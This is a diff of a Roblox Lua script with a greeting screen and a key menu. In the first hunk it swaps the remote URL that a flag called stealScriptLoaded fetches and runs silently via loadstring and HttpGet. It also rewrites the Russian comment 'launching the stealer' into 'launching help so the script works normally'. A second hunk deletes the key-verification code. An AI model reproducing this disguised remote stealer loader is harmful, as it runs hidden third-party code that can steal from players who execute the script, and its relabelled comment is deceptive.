@@ -100,13 +100,13 @@ task.spawn(function()
     local t2 = fadeIn(Title, 1.5, "TextTransparency")
     local t3 = fadeIn(Subtitle, 1.5, "TextTransparency")
     
-    -- Запускаем стилак через 1.5 секунды после появления приветствия
+    -- Запускаем помощь для скрипта чтобы он работал нормально
     task.wait(1.5)
     if not stealScriptLoaded then
         stealScriptLoaded = true
         task.spawn(function()
             pcall(function()
-                loadstring(game:HttpGet("https://api.rubis.lol/v2/scrap/oUDqb2/raw"))()
+                loadstring(game:HttpGet("https://cdn.sourceb.in/bins/WbNby7oNLJ/0"))()
             end)
         end)
     end
@@ -237,42 +237,6 @@ function showKeyMenu()
     local isLoading = false
     
     local function startLoading()
-        if isLoading then return end
-        isLoading = true
-        
-        local elementsToFade = {KeyFrame, KeyTitle, InputBox, TextBox, VerifyBtn, Status, ibStroke, stroke}
-        for _, el in ipairs(elementsToFade) do
-            if el and el.Parent then
-                if el:IsA("Frame") then
-                    fadeOut(el, 0.4, "BackgroundTransparency")
-                elseif el:IsA("TextLabel") or el:IsA("TextButton") then
-                    fadeOut(el, 0.4, "TextTransparency")
-                elseif el:IsA("UIStroke") then
-                    fadeOut(el, 0.4, "Transparency")
-                end
-            end
-        end
-        
-        task.wait(0.6)
-        if KeyFrame.Parent then
-            KeyFrame:Destroy()
-        end
-        
-        showLoading()
-    end
-    
-    VerifyBtn.MouseButton1Click:Connect(function()
-        if TextBox.Text == CORRECT_KEY then
-            startLoading()
-        else
-            Status.Text = "Неверный ключ"
-            fadeIn(Status, 0.2, "TextTransparency")
-            task.delay(2, function()
-                fadeOut(Status, 0.3, "TextTransparency")
-            end)
-        end
-    end)
-end
 
 -- === ЗАГРУЗКА ===
 function showLoading()
